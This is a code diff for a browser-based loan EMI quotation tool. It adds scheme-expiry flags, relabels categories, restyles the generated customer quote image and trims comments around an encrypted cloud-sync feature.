+        let catMatches = validRecords.filter(r => (r.category || '').toUpperCase().includes(q)).map(r => r.model);
+        
+        let matches = [...new Set([...brandMatches, ...catMatches])].slice(0, 20);
+        
+        if (matches.length === 0) {
+            dd.innerHTML = `<div style="padding:10px; color:#d35400; font-weight:bold; text-align:center;">No matching models found.</div>`;
+            dd.style.display = 'block';
+            return;
+        }
+
+        dd.innerHTML = matches.map(m => {
+            let rec = validRecords.find(x => x.model === m);
+            let catTag = rec && rec.category ? `<span style="font-size:10px; background:#e0e0e0; color:#333; padding:2px 6px; border-radius:4px; float:right;">📁 ${rec.category}</span>` : '';
+            return `<div style="padding:10px; border-bottom:1px solid #eee; cursor:pointer; font-weight:800; color:var(--dark); overflow:hidden;" onmouseover="this.style.background='#e3f2fd'" onmouseout="this.style.background='#fff'" onclick="viewGlobalModel('${m}')">📱 ${m} ${catTag}</div>`;
+        }).join('');
+        
+        dd.style.display = 'block';
     }
 
     function viewGlobalModel(name) {
@@ -1322,11 +1427,7 @@
             if (!stats[cat].brands[mod]) stats[cat].brands[mod] = 0; stats[cat].brands[mod]++;
         });
         
-        let html = `
-        <div style="position: sticky; top: 0; background: #fff; z-index: 10; color:var(--success); font-weight:900; text-align:center; border-bottom: 2px solid var(--success); padding: 10px; margin-bottom: 8px; border-radius: 6px 6px 0 0; box-shadow: 0 2px 5px rgba(0,0,0,0.05);">
-            ✅ GITHUB MASTER SYSTEM: ${totalSchemes} MODELS ALIVE
-        </div>
-        <div style="padding: 0 10px 10px 10px;">`;
+        let html = `<div style="padding: 10px;">`;
         
         let sortedCats = Object.keys(stats).sort();
         sortedCats.forEach(cat => {
@@ -1365,7 +1466,7 @@
         for(let i=1; i<=10; i++) {
             let ten = parseInt(document.getElementById(`msTen_${i}`).value) || 0; let fix = parseInt(document.getElementById(`msFix_${i}`).value) || 0;
             if(ten > 0 || fix > 0) {
-                validSchemes.push({ tenure: ten, advEmi: parseInt(document.getElementById(`msAdv_${i}`).value) || 0, dbd: parseFloat(document.getElementById(`msDbd_${i}`).value) || 0, pf: parseInt(document.getElementById(`msPf_${i}`).value) || 0, roi: parseFloat(document.getElementById(`msRoi_${i}`).value) || 0, fixedEmi: fix, minLoan: 0, maxLoan: 9999999, category: "MANUAL", inactive: false });
+                validSchemes.push({ tenure: ten, advEmi: parseInt(document.getElementById(`msAdv_${i}`).value) || 0, dbd: parseFloat(document.getElementById(`msDbd_${i}`).value) || 0, pf: parseInt(document.getElementById(`msPf_${i}`).value) || 0, roi: parseFloat(document.getElementById(`msRoi_${i}`).value) || 0, fixedEmi: fix, minLoan: 0, maxLoan: 9999999, category: "MANUAL", inactive: false, isExpired: false });
             }
         }
         if(validSchemes.length > 0) {
@@ -1386,7 +1487,32 @@
 
     function mapData(row, type) { 
         if(!row) return null;
-        return { model: type === SPECIAL_MODEL ? SPECIAL_MODEL : String(findValLocal(row,['MODEL','BRANDMODEL'])||"").toUpperCase(), mrp: parseFloat(findValLocal(row, ['MRP', 'PRICE', 'M.R.P'])) || 0, tenure: parseInt(findValLocal(row, ['TOTALTENURE', 'TENURE', 'TA'])) || 0, advEmi: parseInt(findValLocal(row, ['ADVANCEEMI', 'ADV'])) || 0, dbd: parseFloat(findValLocal(row,['DBD','DBD%'])||0), pf: parseInt(findValLocal(row,['PF','PROCESSINGFEE'])||0), roi: parseFloat(findValLocal(row,['ROI','ROI%'])||0), fixedEmi: parseFloat(findValLocal(row,['FIXEDEMI', 'FIXED'])||0), category: String(findValLocal(row,['CATEGORY','CAT'])||""), minLoan: parseFloat(findValLocal(row, ['MINLOAN', 'MINL'])) || 0, maxLoan: parseFloat(findValLocal(row, ['MAXLOAN', 'MAXL'])) || 9999999, inactive: false }; 
+        
+        let expVal = findValLocal(row, ['EXPIRY', 'EXPIRYDATE', 'VALIDTILL', 'SCHEMEEXPIRY', 'ENDDATE']);
+        let expDate = parseExcelDate(expVal);
+        let isExp = false;
+        
+        if(expDate) {
+            let today = new Date(); 
+            today.setHours(0,0,0,0);
+            if(expDate < today) isExp = true;
+        }
+
+        return { 
+            model: type === SPECIAL_MODEL ? SPECIAL_MODEL : String(findValLocal(row,['MODEL','BRANDMODEL'])||"").toUpperCase(), 
+            mrp: parseFloat(findValLocal(row, ['MRP', 'PRICE', 'M.R.P'])) || 0, 
+            tenure: parseInt(findValLocal(row, ['TOTALTENURE', 'TENURE', 'TA'])) || 0, 
+            advEmi: parseInt(findValLocal(row, ['ADVANCEEMI', 'ADV'])) || 0, 
+            dbd: parseFloat(findValLocal(row,['DBD','DBD%'])||0), 
+            pf: parseInt(findValLocal(row,['PF','PROCESSINGFEE'])||0), 
+            roi: parseFloat(findValLocal(row,['ROI','ROI%'])||0), 
+            fixedEmi: parseFloat(findValLocal(row,['FIXEDEMI', 'FIXED'])||0), 
+            category: standardizeCategoryName(findValLocal(row,['CATEGORY','CAT'])||""), 
+            minLoan: parseFloat(findValLocal(row, ['MINLOAN', 'MINL'])) || 0, 
+            maxLoan: parseFloat(findValLocal(row, ['MAXLOAN', 'MAXL'])) || 9999999, 
+            isExpired: isExp,
+            inactive: false 
+        }; 
     }
 
     function goHome() { 
@@ -1449,13 +1575,17 @@
         if (!isLimitValid()) return; if(db_records.length === 0) return alert("⚠️ Master database fetch me error hai!");
         document.getElementById('addProductModal').style.display = 'none'; 
         let tieup = db_records.filter(r => r.model === SPECIAL_MODEL); let cats = [...new Set(tieup.map(r => r.category))].sort(); 
-        document.getElementById('categoryGrid').innerHTML = cats.map(c => `<div style="background:var(--indigo);color:white;padding:12px;border-radius:4px;cursor:pointer;font-weight:900;text-align:center;" onclick="selectCategory('${c}')">${c}</div>`).join(''); 
+        document.getElementById('categoryGrid').innerHTML = cats.map(c => {
+            let label = (c === 'PHONE(WEB-MOBILE)') ? 'PHONE, TABLET, SMART WATCH' : c;
+            return `<div style="background:var(--indigo);color:white;padding:12px;border-radius:4px;cursor:pointer;font-weight:900;text-align:center;" onclick="selectCategory('${c}')">${label}</div>`;
+        }).join(''); 
         document.getElementById('catSelectionModal').style.display = 'flex';
     }
 
     function selectCategory(catName) {
         document.getElementById('catSelectionModal').style.display = 'none';
-        tempPendingProduct = { name: SPECIAL_MODEL + " - " + catName, isNT: true, category: catName };
+        let displayName = (catName === 'PHONE(WEB-MOBILE)') ? 'PHONE / TABLET / SMART WATCH' : catName;
+        tempPendingProduct = { name: SPECIAL_MODEL + " - " + displayName, isNT: true, category: catName };
         currentModalCategory = catName; 
         finalizeProductAddition();
     }
@@ -1611,10 +1741,8 @@
 
     function instantSingleQuote(pIdx) {
         window.tempImageGenIndices = [pIdx];
-        let c = customerQueue[activeCustomerIndex];
-        document.getElementById('promptCustName').value = c?.name === "-" ? "" : (c?.name || ""); 
-        document.getElementById('promptCustMobile').value = c?.mobile || "";
-        document.getElementById('custInfoPromptModal').style.display = 'flex';
+        requestWhatsAppDispatch = false;
+        doGenerateCustomerImage();
     }
 
     function renderMatrix() {
@@ -1797,7 +1925,7 @@
                 if(parseFloat(inp.target) > 0 && effectivePrice > 0) { let advRate = s.advEmi / s.tenure; let numerator = parseFloat(inp.target) - effectivePrice - s.pf - totalFees; let denominator = advRate + dbdRate + roiRateDP - 1; let solvedLoan = numerator / denominator; loan = Math.min(loan, Math.max(0, Math.floor(solvedLoan))); }
                 inst = s.tenure - s.advEmi; if(inst < 1) inst = 1; let insTotal = (parseFloat(inp.gtl)||0)+(parseFloat(inp.rfc)||0)+(parseFloat(inp.exw)||0); let roiInEmi = loan * roiRate; emi = (loan / s.tenure) + (insTotal / inst) + roiInEmi;
                 if(emi > parseFloat(inp.cap) && parseFloat(inp.cap) > 0) { loan = (parseFloat(inp.cap) - (insTotal/inst)) / ( (1/s.tenure) + roiRate ); roiInEmi = loan * roiRate; emi = (loan / s.tenure) + (insTotal / inst) + roiInEmi; }
-                let roiInDp = loan * roiRateDP; dpExact = effectivePrice - loan + ((loan/s.tenure) * s.advEmi) + (loan * dbdRate) + s.pf + totalFees + roiInDp;
+                let roiInDp = loan * roiRateDP; dpExact = effectivePrice - loan + ((loan/s.tenure) * s.advEmi) + (loan * dbdRate) + pf + totalFees + roiInDp;
             }
             if(dpExact > 0) dpRounded = Math.ceil(dpExact / 10) * 10; else dpRounded = dpExact;
             let extraVal = effectivePrice > 0 ? (((emi * inst) + dpRounded) - effectivePrice) : 0; let dbdAmt = loan * dbdRate; let roiAmt = (loan * roiRateDP) + (loan * roiRate * inst);
@@ -1817,12 +1945,13 @@
         prod.calculatedData.sort((a,b) => conf.dir==='asc' ? a[conf.key]-b[conf.key] : b[conf.key]-a[conf.key]);
         let ltvLimit = customerQueue[activeCustomerIndex]?.ltv || 100; let isNT = prod.isNonTieup;
 
-        let festiveBadgeHtml = window.isFestiveMode ? `<span style="background:var(--warning); color:#000; font-size:10px; padding:2px 4px; border-radius:3px; font-weight:900; margin-left:6px; display:inline-block; vertical-align:middle; line-height:1;">✨ OFFER</span>` : '';
-
         document.getElementById(`body_${pIdx}`).innerHTML = prod.calculatedData.map(d => {
             let curLTV = d.curLTV; let isLtvB = (curLTV > ltvLimit); 
             let isBoundB = false; if (isNT && prod.inputs.mrp > 0) { if (d.loan < d.minLoan || d.loan > d.maxLoan) isBoundB = true; }
-            let isInactive = d.inactive; let rowClass = (d.isFixed ? "fixed-row " : "") + (isLtvB || isBoundB ? "ltv-breach " : "") + (isInactive ? "inactive-row " : "");
+            let isInactive = d.inactive; 
+            
+            let rowClass = (d.isFixed ? "fixed-row " : "") + (isLtvB || isBoundB ? "ltv-breach " : "") + (d.isExpired && !isInactive ? "expired-row " : "") + (isInactive ? "inactive-row " : "");
+            
             let toggleBtnHTML = isInactive ? `<button class="action-btn" style="background:var(--success);" onclick="toggleInactive(${pIdx}, ${d.dIdx})">ADD</button>` : `<button class="action-btn" style="background:var(--danger);" onclick="toggleInactive(${pIdx}, ${d.dIdx})">DISABLE</button>`;
 
             return `<tr id="row_${pIdx}_${d.dIdx}" class="${rowClass}">
@@ -1836,7 +1965,12 @@
                 <td class="hidden-col" id="extra_${pIdx}_${d.dIdx}" style="font-weight:900; color:var(--danger);">₹${Math.round(d.extra).toLocaleString()}</td>
                 ${isNT ? `<td class="bound-col">${d.minLoan > 0 ? '₹' + d.minLoan : '0'}</td><td class="bound-col">${d.maxLoan < 9999999 ? '₹' + d.maxLoan : 'NO'}</td>` : `<td style="color:#777;">₹${Math.floor(d.nbfcMaxL)}</td>`}
                 <td><div class="stepper"><button class="step-btn" onclick="step(${pIdx},${d.dIdx},-${d.isFixed ? d.fixedEmi : 1000})">-</button><input id="l_${pIdx}_${d.dIdx}" type="number" value="${Math.floor(d.loan)}" class="step-inp" oninput="manual(${pIdx},${d.dIdx})"><button class="step-btn" onclick="step(${pIdx},${d.dIdx},${d.isFixed ? d.fixedEmi : 1000})">+</button></div></td>
-                <td id="ta_${pIdx}_${d.dIdx}" style="font-weight:900;">${d.currentTenure}/${d.advEmi}${festiveBadgeHtml}</td>
+                
+                <td id="ta_${pIdx}_${d.dIdx}" style="font-weight:900;">
+                    ${d.currentTenure}/${d.advEmi}
+                    ${d.isExpired ? `<div style="color:#d35400; font-size:9px; font-weight:900; margin-top:3px; line-height:1.2; background:#ffeaa7; padding:2px; border-radius:3px;">⚠️ EXPIRED<br>Check Live</div>` : ''}
+                </td>
+                
                 <td id="dp_${pIdx}_${d.dIdx}" style="color:var(--success); font-weight:950;">₹${Math.round(d.dp).toLocaleString()}</td>
                 <td id="emi_${pIdx}_${d.dIdx}" style="color:var(--primary); font-weight:950;">₹${Math.round(d.emi).toLocaleString()}</td>
                 <td id="inst_${pIdx}_${d.dIdx}" style="font-weight:900;">${d.inst}</td>
@@ -1873,7 +2007,11 @@
             let roiInEmi = loan * roiRate; let roiInDp = loan * roiRateDP;  
             dpE = effectivePrice - loan + (d.fixedEmi * d.advEmi) + (loan * dbdRate) + d.pf + totalFees + roiInDp; dpR = Math.ceil(dpE / 10) * 10; let inst = calcTenure - d.advEmi; if(inst < 1) inst = 1;
             let emi = d.fixedEmi + (((parseFloat(inp.gtl)||0) + (parseFloat(inp.rfc)||0) + (parseFloat(inp.exw)||0)) / inst) + roiInEmi;
-            document.getElementById(`ta_${pIdx}_${dIdx}`).innerHTML = `${calcTenure}/${d.advEmi}${window.isFestiveMode ? `<span style="background:var(--warning); color:#000; font-size:10px; padding:2px 4px; border-radius:3px; font-weight:900; margin-left:6px; display:inline-block; vertical-align:middle; line-height:1;">✨ OFFER</span>` : ''}`; document.getElementById(`inst_${pIdx}_${dIdx}`).innerText = inst;
+            
+            let expBadge = d.isExpired ? `<div style="color:#d35400; font-size:9px; font-weight:900; margin-top:3px; line-height:1.2; background:#ffeaa7; padding:2px; border-radius:3px;">⚠️ EXPIRED<br>Check Live</div>` : '';
+            
+            document.getElementById(`ta_${pIdx}_${dIdx}`).innerHTML = `${calcTenure}/${d.advEmi}${expBadge}`; 
+            document.getElementById(`inst_${pIdx}_${dIdx}`).innerText = inst;
             d.loan = loan; d.currentTenure = calcTenure; d.dp = dpR; d.inst = inst; d.emi = emi;
         } else {
             let nbfcMaxL = (currentLimit * d.tenure) / (d.tenure - d.advEmi || 1); 
@@ -1898,7 +2036,16 @@
         let extraCell = document.getElementById(`extra_${pIdx}_${dIdx}`); if(extraCell) extraCell.innerText = "₹" + Math.round(d.extra).toLocaleString();
         
         let isB = (d.curLTV > ltvLimit) || (prod.isNonTieup && loan > 0 && (loan < d.minLoan || loan > d.maxLoan));
-        let rowEl = document.getElementById(`row_${pIdx}_${dIdx}`); if(rowEl) isB ? rowEl.classList.add('ltv-breach') : rowEl.classList.remove('ltv-breach');
+        let rowEl = document.getElementById(`row_${pIdx}_${dIdx}`); 
+        
+        if(rowEl) {
+            if (isB) {
+                rowEl.classList.add('ltv-breach');
+            } else {
+                rowEl.classList.remove('ltv-breach');
+            }
+        }
+        
         let dbdCell = document.querySelector(`#row_${pIdx}_${dIdx} td:nth-child(2)`); if(dbdCell) dbdCell.innerHTML = `${+parseFloat(d.dbd).toFixed(3)}%<br><span style="color:var(--danger); font-weight:900;">₹${Math.round(d.dbdAmt||0).toLocaleString()}</span>`;
         let roiCell = document.querySelector(`#row_${pIdx}_${dIdx} td:nth-child(4)`); if(roiCell) roiCell.innerHTML = `${+parseFloat(d.roi).toFixed(2)}%<br><span style="color:var(--danger); font-weight:900;">₹${Math.round(d.roiAmt||0).toLocaleString()}</span>`;
         
@@ -1932,7 +2079,22 @@
     }
 
     async function executeManualAction() {
-        let mode = document.getElementById('targetPIdx').value; let scheme = { tenure: parseInt(document.getElementById('manTen').value), advEmi: parseInt(document.getElementById('manAdv').value), dbd: parseFloat(document.getElementById('manDbd').value)||0, pf: parseInt(document.getElementById('manPf').value)||0, roi: parseFloat(document.getElementById('manRoi').value)||0, fixedEmi: parseInt(document.getElementById('manFixed').value)||0, minLoan: 0, maxLoan: 9999999, category: "MANUAL", inactive: false };
+        let mode = document.getElementById('targetPIdx').value; 
+        
+        let scheme = { 
+            tenure: parseInt(document.getElementById('manTen').value), 
+            advEmi: parseInt(document.getElementById('manAdv').value), 
+            dbd: parseFloat(document.getElementById('manDbd').value)||0, 
+            pf: parseInt(document.getElementById('manPf').value)||0, 
+            roi: parseFloat(document.getElementById('manRoi').value)||0, 
+            fixedEmi: parseInt(document.getElementById('manFixed').value)||0, 
+            minLoan: 0, 
+            maxLoan: 9999999, 
+            category: "MANUAL", 
+            inactive: false,
+            isExpired: false 
+        };
+        
         let cCap = customerQueue[activeCustomerIndex]?.cap || "";
         if(mode === "NEW") {
             let name = document.getElementById('manName').value.toUpperCase() || "MANUAL MODEL";
@@ -1967,9 +2129,9 @@
         let chks = document.querySelectorAll('.quote-model-chk:checked');
         if(chks.length === 0) return alert("⚠️ Kripya image generate karne ke liye kam se kam ek model select karein!");
         window.tempImageGenIndices = Array.from(chks).map(c => parseInt(c.value));
-        document.getElementById('quoteSelectionModal').style.display = 'none'; let c = customerQueue[activeCustomerIndex];
-        document.getElementById('promptCustName').value = c?.name === "-" ? "" : (c?.name || ""); document.getElementById('promptCustMobile').value = c?.mobile || "";
-        document.getElementById('custInfoPromptModal').style.display = 'flex';
+        document.getElementById('quoteSelectionModal').style.display = 'none';
+        requestWhatsAppDispatch = false;
+        doGenerateCustomerImage();
     }
     
     let requestWhatsAppDispatch = false;
@@ -1977,55 +2139,84 @@
     function proceedGenerateImageAndWhatsAppCopy() { requestWhatsAppDispatch = true; document.getElementById('custInfoPromptModal').style.display = 'none'; doGenerateCustomerImage(); }
 
     function doGenerateCustomerImage() {
-        let quoteDiv = document.createElement('div'); quoteDiv.style.width = "540px"; quoteDiv.style.padding = "25px 20px"; quoteDiv.style.background = "#fff"; quoteDiv.style.position = "absolute"; quoteDiv.style.top = "-9999px"; quoteDiv.style.fontFamily = "'Segoe UI', sans-serif";
-        let c = customerQueue[activeCustomerIndex]; let headerText = c?.name !== "-" ? c.name.toUpperCase() : "CUSTOMER QUOTATION";
+        let quoteDiv = document.createElement('div'); 
+        quoteDiv.style.width = "560px"; 
+        quoteDiv.style.padding = "25px"; 
+        quoteDiv.style.background = "#fff"; 
+        quoteDiv.style.position = "absolute"; 
+        quoteDiv.style.top = "-9999px"; 
+        quoteDiv.style.fontFamily = "'Segoe UI', sans-serif";
+        
+        let c = customerQueue[activeCustomerIndex]; 
+        let headerText = c?.name && c.name !== "-" ? c.name.toUpperCase() : "CUSTOMER QUOTATION";
+        let ltvLimit = c?.ltv || 100;
 
         let html = `
-        <div style="text-align:center; border-bottom:4px solid var(--bajaj-blue); padding-bottom:15px; margin-bottom:20px;">
-            <h2 style="margin:0; color:var(--bajaj-blue); font-size:28px; font-weight:900; letter-spacing: 1px;">${headerText}</h2>
-            ${c?.mobile ? `<h3 style="margin:5px 0 0 0; color:#333; font-size:22px;">📞 ${c.mobile}</h3>` : ''}
-            <div style="margin-top:10px; font-size:14px; color:#555; display:flex; justify-content:center; gap:15px; font-weight:bold; flex-wrap:wrap;">
-                <span style="background:#f0f0f0; padding:4px 10px; border-radius:4px;">LIMIT: ₹${c?.limit || 0}</span>
-                <span style="background:#f0f0f0; padding:4px 10px; border-radius:4px;">LTV: ${c?.ltv || 100}%</span>
-                <span style="background:#f0f0f0; padding:4px 10px; border-radius:4px;">TYPE: ${c?.type || 'NEW'}</span>
-                ${c?.cap ? `<span style="background:#f0f0f0; padding:4px 10px; border-radius:4px;">EMI CAPPING: ₹${c.cap}</span>` : ''}
+        <div style="background: linear-gradient(135deg, var(--bajaj-blue) 0%, var(--indigo) 100%); border-radius: 12px; padding: 25px; color: white; text-align: center; margin-bottom: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.15);">
+            <h2 style="margin:0; font-size:28px; font-weight:900; letter-spacing: 1px; color:#fff;">🎉 EXCLUSIVE OFFERS FOR YOU!</h2>
+            <h3 style="margin:8px 0 18px 0; color:#87c3f7; font-size:22px;">👤 ${headerText} ${c?.mobile ? `| 📞 ${c.mobile}` : ''}</h3>
+            
+            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px; border: 1px dashed rgba(255,255,255,0.4); display: inline-block; width: 90%;">
+                <div style="font-size: 14px; color: #e0e0e0; font-weight: bold; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px;">Your Approved Eligibility</div>
+                <div style="display:flex; justify-content:center; gap:20px; font-weight:900; font-size: 17px;">
+                    <span style="color:#00e676;">LIMIT: ₹${c?.limit || 0}</span>
+                    <span style="color:#ffd54f;">MAX LTV: ${ltvLimit}%</span>
+                    <span style="color:#fff;">TYPE: ${c?.type || 'NEW'}</span>
+                    ${c?.cap ? `<span style="color:#ff8a65;">EMI CAP: ₹${c.cap}</span>` : ''}
+                </div>
             </div>
         </div>`;
         
-        let hasV = false; let ltvLimit = c?.ltv || 100;
+        let hasV = false; 
         let productsToRender = window.tempImageGenIndices.map(idx => current_products[idx]);
 
         productsToRender.forEach((prod) => {
-            let validS = prod.calculatedData.filter(d => { let isLtvB = (d.curLTV > ltvLimit); let isBoundB = false; if (prod.isNonTieup && prod.inputs.mrp > 0) { if (d.loan < d.minLoan || d.loan > d.maxLoan) isBoundB = true; } return !isLtvB && !isBoundB && !d.inactive; });
-            if(validS.length === 0) return; hasV = true; let invAmt = prod.inputs.inv > 0 ? prod.inputs.inv : prod.inputs.mrp;
             
-            html += `<div style="margin-bottom:30px; border-radius: 8px; overflow: hidden; border: 2px solid #ddd; box-shadow: 0 4px 10px rgba(0,0,0,0.05);">
-            <div style="background:#f8f9fa; padding:15px; border-left:8px solid var(--bajaj-green); display:flex; flex-direction:column; gap:5px;">
-                <h3 style="margin:0; color:var(--bajaj-blue); font-size:22px; font-weight:900; line-height:1.3;">${prod.name}</h3>
-                <span style="color:#555; font-size:18px; font-weight:900;">INVOICE AMT: <span style="color:var(--bajaj-blue);">₹${invAmt}</span></span>
+            let validS = prod.calculatedData.filter(d => { 
+                let isLtvB = (d.curLTV > ltvLimit); 
+                let isBoundB = false; 
+                if (prod.isNonTieup && prod.inputs.mrp > 0) { 
+                    if (d.loan < d.minLoan || d.loan > d.maxLoan) isBoundB = true; 
+                } 
+                return !isLtvB && !isBoundB && !d.inactive && d.loan > 0; 
+            });
+            
+            if(validS.length === 0) return; 
+            hasV = true; 
+            let invAmt = prod.inputs.inv > 0 ? prod.inputs.inv : prod.inputs.mrp;
+            
+            html += `<div style="margin-bottom:25px; border-radius: 10px; overflow: hidden; border: 2px solid #ddd; box-shadow: 0 4px 10px rgba(0,0,0,0.05);">
+            <div style="background:#f8f9fa; padding:15px; border-left:8px solid var(--bajaj-green); display:flex; justify-content: space-between; align-items: center;">
+                <h3 style="margin:0; color:var(--bajaj-blue); font-size:22px; font-weight:900;">📱 ${prod.name}</h3>
+                <div style="background: var(--bajaj-blue); color: white; padding: 6px 12px; border-radius: 6px; font-size:18px; font-weight:bold;">INV: ₹${invAmt}</div>
             </div>
             <table style="width:100%; border-collapse:collapse; text-align:center; font-weight:900; font-size:18px;">
                 <thead>
-                    <tr style="background:#eaeaea; color:#000000; font-size:16px;">
-                        <th style="padding:15px 8px; border:1px solid #ccc;">SCHEME</th><th style="padding:15px 8px; border:1px solid #ccc;">DP</th><th style="padding:15px 8px; border:1px solid #ccc;">EMI</th><th style="padding:15px 8px; border:1px solid #ccc;">MON</th><th style="padding:15px 8px; border:1px solid #ccc;">DAILY</th>
+                    <tr style="background:#eaeaea; color:#333; font-size:16px;">
+                        <th style="padding:14px 6px; border:1px solid #ccc;">SCHEME</th>
+                        <th style="padding:14px 6px; border:1px solid #ccc;">DP</th>
+                        <th style="padding:14px 6px; border:1px solid #ccc;">EMI</th>
+                        <th style="padding:14px 6px; border:1px solid #ccc;">M</th>
+                        <th style="padding:14px 6px; border:1px solid #ccc;">DAILY</th>
                     </tr>
                 </thead>
                 <tbody>`;
             
             validS.forEach((d, i) => { 
-                html += `<tr style="background:${i%2==0?'#ffffff':'#f9f9f9'}; color:#000000;">
-                    <td style="padding:15px 8px; border:1px solid #ccc; font-size:18px;">${d.currentTenure}/${d.advEmi}</td>
-                    <td style="padding:15px 8px; border:1px solid #ccc; color:var(--bajaj-green); font-size:20px;">₹${Math.round(d.dp)}</td>
-                    <td style="padding:15px 8px; border:1px solid #ccc; color:var(--bajaj-blue); font-size:20px;">₹${Math.round(d.emi)}</td>
-                    <td style="padding:15px 8px; border:1px solid #ccc; font-size:18px;">${d.inst}</td>
-                    <td style="padding:15px 8px; border:1px solid #ccc; color:var(--bajaj-green); font-size:20px;">₹${Math.round(d.daily)}</td>
+                html += `<tr style="background:${i%2==0?'#ffffff':'#f9f9f9'}; color:#000;">
+                    <td style="padding:14px 6px; border:1px solid #ccc; font-size:19px; color:#333;">${d.currentTenure}/${d.advEmi}</td>
+                    <td style="padding:14px 6px; border:1px solid #ccc; color:var(--bajaj-green); font-size:21px;">₹${Math.round(d.dp).toLocaleString()}</td>
+                    <td style="padding:14px 6px; border:1px solid #ccc; color:var(--bajaj-blue); font-size:21px;">₹${Math.round(d.emi).toLocaleString()}</td>
+                    <td style="padding:14px 6px; border:1px solid #ccc; font-size:19px; color:#333;">${d.inst}</td>
+                    <td style="padding:14px 6px; border:1px solid #ccc; color:#d35400; font-size:21px;">₹${Math.round(d.daily).toLocaleString()}</td>
                 </tr>`; 
             });
             html += `</tbody></table></div>`;
         });
         
-        if(!hasV) { alert("⚠️ Image me dikhane ke liye koi active ya eligible scheme bachi hi nahi hai!"); return; }
-        html += `<div style="text-align:center; margin-top: 20px; color:#888; font-size: 14px; font-weight: bold;">Generated via Persistent Portal</div>`;
+        if(!hasV) { alert("⚠️ Eligibility नुसार या कस्टमरसाठी या मॉडेलमध्ये कोणतीही Scheme बसत नाही (Due to Limit, LTV, or Constraints)!"); return; }
+        
+        html += `<div style="text-align:center; margin-top: 15px; color:#aaa; font-size: 14px; font-weight: bold; border-top: 1px dashed #ddd; padding-top: 15px;">Generated securely via Persistent Portal</div>`;
         quoteDiv.innerHTML = html; document.body.appendChild(quoteDiv);
         
         html2canvas(quoteDiv, {scale: 2}).then(canvas => { 
@@ -2083,10 +2274,6 @@
         if (url && url !== '#' && url.trim() !== '') { if (!url.startsWith('http://') && !url.startsWith('https://')) { url = 'https://' + url; } window.open(url, '_blank'); closeDealerSearchModal(); } else { alert('⚠️ Ya dealer sathi Bitly link available nahi ahe!'); }
     }
 
-    // =========================================================================
-    // 🔒 NPOINT.IO "HEAVYWEIGHT" E2EE SYNC ENGINE (20MB Capacity + Open CORS)
-    // =========================================================================
-
     function openSyncModal() {
         document.getElementById('syncStatusMsg').style.display = 'none';
         document.getElementById('pullCodeInput').value = '';
@@ -2123,7 +2310,6 @@
         box.style.display = 'block';
     }
 
-    // 1. PUSH TO NPOINT CLOUD VAULT
     async function generateAndPushCode() {
         if (typeof CryptoJS === 'undefined') {
             alert("⛔ Technical Alert: CryptoJS security library load zali nahiye. Kripya PC var internet chaloo ahe ka te check kara kiva browser cha Ad-blocker band kara.");
@@ -2151,7 +2337,7 @@
         }));
 
         let securePayload = {
-            ver: "76.5",
+            ver: "76.16",
             activeIdx: activeCustomerIndex,
             queue: compactQueue,
             time: new Date().toISOString()
@@ -2185,7 +2371,6 @@
         }
     }
 
-    // 2. PULL & NATIVE RE-HYDRATION
     async function pullDataFromCloud() {
         if (typeof CryptoJS === 'undefined') {
             alert("⛔ Technical Alert: CryptoJS library loaded nahi."); return;
